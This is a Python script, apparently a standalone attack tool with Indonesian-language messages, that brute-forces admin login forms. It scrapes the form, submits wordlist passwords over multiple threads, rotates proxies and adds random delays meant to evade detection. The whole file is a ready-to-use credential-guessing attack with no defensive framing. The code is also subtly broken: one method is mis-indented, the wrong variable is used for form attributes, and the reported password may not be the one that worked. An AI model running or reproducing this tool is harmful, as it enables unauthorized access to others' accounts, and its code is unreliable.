#!/usr/bin/env python3
# Advanced BruteForce Admin Login Tool
# Banner: bimatzy999
# Pembuat: bimatzy999

import requests
import sys
import time
import random
import argparse
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
import os
import re
import socket
from urllib.parse import urlparse

class Color:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

def print_banner():
    banner = f"""
{Color.PURPLE}  ▄▄▄▄▄   ▄  ▄▄  ▄▄▄▄▄▄ ▄▄▄▄▄  ▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄ ▄▄▄▄▄ 
 █ ▄▄▄ █ █▄▀ █▀ █ ▄▄▄ █ █ ▄▄▄ █ ▄ █ ▄ █▀▄▄▀█ █ ▄▄▄ █ ▄ █ █ ▄▄▄ █ 
 █ ███ █ ▄▀█▀▄ █ ███ █ █ ███ █ █ █ ▄▀█ ███ █ █ ███ █ █ █ █ ███ █ 
 █▄▄▄▄▄█ █ ▀▄ █ █▄▄▄▄▄█ █▄▄▄▄▄█ █▄█ █ █▄▄▄█ █▄▄▄▄▄█ █▄█ █▄▄▄▄▄█ 
 ▄▄▄▄▄ ▄▄▄ ▄▄█ █▄▄ ▄▄▀▄█ ▄▄ █▄█  █▄▄  ▀▄▄▀ ▄▀▄▄ ▄▄▄█ █ █ ▄▄▄ ▄  
 ▀▀▀▄█▀▄ ▀▄▀▀▀▄▄▀▄▄▄▀▀▄▀▄▀▄▄▀▄▄▀▄▀▀▄▀▀▄▀▄▀▄▀▀▀▄▀▀▄▀▀▀▄▀▄▀▀▀▄▀▀▀▄ 
{Color.CYAN}
 ▄▄▄▄▄▄ ▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄ ▄▄▄▄▄ 
 █ ▄▄▄ █ ▄ █▀▄▄▀█ █ ▄▄▄ █ █ ▄▄▄ █ ▄▄▄▄▄ █ ▄▄▄ █ ▄▄▄ █ ▄ █ █ ▄▄▄ █ 
 █ ███ █ █ ███ █ █ ███ █ █ ███ █ ▄▄▄▄▄ █ ███ █ ███ █ █ █ █ ███ █ 
 █▄▄▄▄▄█ █ █▄▄▄█ █▄▄▄▄▄█ █▄▄▄▄▄█ █▄▄▄█ █▄▄▄▄▄█▄▄▄▄▄█ █▄█ █▄▄▄▄▄█ 
 ▄▄▄▄▄ ▄▄▄ ▄▄▄ ▄▄▄ ▄▄▄ ▄▄▄ ▄▄▄ ▄▄▄ ▄▄▄ ▄▄▄ ▄▄▄ ▄▄▄ ▄▄▄ ▄▄▄ ▄▄▄ 
 ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀{Color.END}

{Color.BOLD}{Color.RED}Advanced BruteForce Admin Login Tool{Color.END}
{Color.BOLD}{Color.YELLOW}Created by: bimatzy999{Color.END}
{Color.BOLD}{Color.CYAN}Version: 2.0{Color.END}
"""
    print(banner)

class BruteForcer:
    def __init__(self):
        self.found = False
        self.total_tried = 0
        self.start_time = time.time()
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
    def detect_login_form(self, url):
        try:
            print(f"{Color.BLUE}[*] Menganalisis halaman login...{Color.END}")
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            forms = soup.find_all('form')
            if not forms:
                print(f"{Color.RED}[-] Tidak menemukan form login!{Color.END}")
                return None
            
            login_form = None
            for form in forms:
                if any(x in form.text.lower() for x in ['login', 'sign in', 'username', 'password']):
                    login_form = form
                    break
            
            if not login_form:
                print(f"{Color.RED}[-] Tidak dapat mengidentifikasi form login!{Color.END}")
                return None
            
            print(f"{Color.GREEN}[+] Form login terdeteksi!{Color.END}")
            
            # Extract form details
            form_details = {
                'action': form.attrs.get('action', '').strip(),
                'method': form.attrs.get('method', 'get').lower().strip(),
                'inputs': []
            }
            
            for input_tag in form.find_all('input'):
                input_type = input_tag.attrs.get('type', 'text')
                input_name = input_tag.attrs.get('name')
                input_value = input_tag.attrs.get('value', '')
                if input_name and input_type != 'submit':
                    form_details['inputs'].append({
                        'type': input_type,
                        'name': input_name,
                        'value': input_value
                    })
            
            return form_details
            
        except Exception as e:
            print(f"{Color.RED}[-] Error saat menganalisis form: {str(e)}{Color.END}")
            return None
    
    def prepare_target(self, url, form_details):
        if not form_details['action']:
            return url
        
        if form_details['action'].startswith('http'):
            return form_details['action']
        
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        
        if form_details['action'].startswith('/'):
            return base_url + form_details['action']
        else:
            return base_url + '/' + form_details['action']
    
    def try_password(self, target_url, form_details, username, password, proxy=None):
        if self.found:
            return False
            
        self.total_tried += 1
        
        data = {}
        for input_field in form_details['inputs']:
            if input_field['type'] == 'text' or input_field['type'] == 'email':
                data[input_field['name']] = username
            elif input_field['type'] == 'password':
                data[input_field['name']] = password
            else:
                data[input_field['name']] = input_field['value']
        
        try:
            proxies = None
            if proxy:
                proxies = {
                    'http': proxy,
                    'https': proxy
                }
            
            if form_details['method'] == 'post':
                response = self.session.post(target_url, data=data, proxies=proxies, timeout=15, allow_redirects=True)
            else:
                response = self.session.get(target_url, params=data, proxies=proxies, timeout=15, allow_redirects=True)
            
            # Check for successful login patterns
            if self.check_success(response, username):
                self.found = True
                return True
                
            # Random delay to avoid detection
            time.sleep(random.uniform(0.1, 0.5))
            
            return False
            
        except Exception as e:
            print(f"{Color.RED}[-] Error: {str(e)}{Color.END}")
            return False
    
    def check_success(self, response, username):
        # Check common success indicators
        success_patterns = [
            f'welcome.{re.escape(username)}',
            'logout',
            'dashboard',
            'admin panel',
            'successful login',
            'login successful'
        ]
        
        for pattern in success_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                return True
        
        # Check for redirect to different page
        if len(response.history) > 0 and response.url != response.request.url:
            return True
            
        return False
    
    def load_wordlist(self, wordlist_path):
        if not os.path.isfile(wordlist_path):
            print(f"{Color.RED}[-] File wordlist tidak ditemukan!{Color.END}")
            return None
            
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
                
            if not passwords:
                print(f"{Color.RED}[-] Wordlist kosong!{Color.END}")
                return None
                
            return passwords
            
        except Exception as e:
            print(f"{Color.RED}[-] Error membaca wordlist: {str(e)}{Color.END}")
            return None
    
    def load_proxies(self, proxy_file):
        if not proxy_file or not os.path.isfile(proxy_file):
            return None
            
        try:
            with open(proxy_file, 'r') as f:
                proxies = [line.strip() for line in f if line.strip()]
                
            if not proxies:
                print(f"{Color.YELLOW}[!] File proxy ada tapi kosong{Color.END}")
                return None
                
            return proxies
            
        except Exception as e:
            print(f"{Color.YELLOW}[!] Error membaca file proxy: {str(e)}{Color.END}")
            return None
    
    def print_stats(self):
        elapsed = time.time() - self.start_time
        rate = self.total_tried / elapsed if elapsed > 0 else 0
        print(f"\n{Color.CYAN}[*] Statistik:{Color.END}")
        print(f"{Color.WHITE}- Waktu berjalan: {elapsed:.2f} detik{Color.END}")
        print(f"{Color.WHITE}- Percobaan: {self.total_tried}{Color.END}")
        print(f"{Color.WHITE}- Kecepatan: {rate:.2f} percobaan/detik{Color.END}")
    
        def brute_force(self, url, username, wordlist_path, threads=5, proxy_file=None):
        print(f"{Color.BLUE}[*] Memulai brute force attack...{Color.END}")
        
        # Load wordlist
        passwords = self.load_wordlist(wordlist_path)
        if not passwords:
            return False
            
        # Load proxies if provided
        proxies = self.load_proxies(proxy_file) if proxy_file else None
        
        # Detect login form
        form_details = self.detect_login_form(url)
        if not form_details:
            return False
            
        target_url = self.prepare_target(url, form_details)
        print(f"{Color.GREEN}[+] Target URL: {target_url}{Color.END}")
        print(f"{Color.GREEN}[+] Metode: {form_details['method'].upper()}{Color.END}")
        print(f"{Color.GREEN}[+] Parameter yang ditemukan: {[i['name'] for i in form_details['inputs']]}{Color.END}")
        
        print(f"\n{Color.YELLOW}[*] Mencoba {len(passwords)} password dengan {threads} threads...{Color.END}")
        
        try:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = []
                for password in passwords:
                    if self.found:
                        break
                        
                    proxy = random.choice(proxies) if proxies else None
                    futures.append(
                        executor.submit(
                            self.try_password,
                            target_url,
                            form_details,
                            username,
                            password,
                            proxy
                        )
                    )
                    
                for future in futures:
                    if self.found:
                        future.cancel()
                        
            if self.found:
                print(f"\n{Color.GREEN}[+] Login berhasil!{Color.END}")
                print(f"{Color.GREEN}[+] Username: {username}{Color.END}")
                print(f"{Color.GREEN}[+] Password: {password}{Color.END}")
                return True
            else:
                print(f"\n{Color.RED}[-] Login gagal! Password tidak ditemukan dalam wordlist.{Color.END}")
                return False
                
        except KeyboardInterrupt:
            print(f"\n{Color.YELLOW}[!] Dihentikan oleh pengguna.{Color.END}")
            self.print_stats()
            return False
            
        except Exception as e:
            print(f"\n{Color.RED}[-] Error: {str(e)}{Color.END}")
            return False
            
        finally:
            self.print_stats()

def main():
    print_banner()
    
    parser = argparse.ArgumentParser(description='Advanced BruteForce Admin Login Tool')
    parser.add_argument('-u', '--url', required=True, help='URL target login')
    parser.add_argument('-user', '--username', required=True, help='Username untuk login')
    parser.add_argument('-w', '--wordlist', required=True, help='Path ke file wordlist')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Jumlah threads (default: 5)')
    parser.add_argument('-p', '--proxy', help='File proxy (opsional)')
    
    args = parser.parse_args()
    
    bruteforcer = BruteForcer()
    bruteforcer.brute_force(
        url=args.url,
        username=args.username,
        wordlist_path=args.wordlist,
        threads=args.threads,
        proxy_file=args.proxy
    )

if __name__ == '__main__':
    main()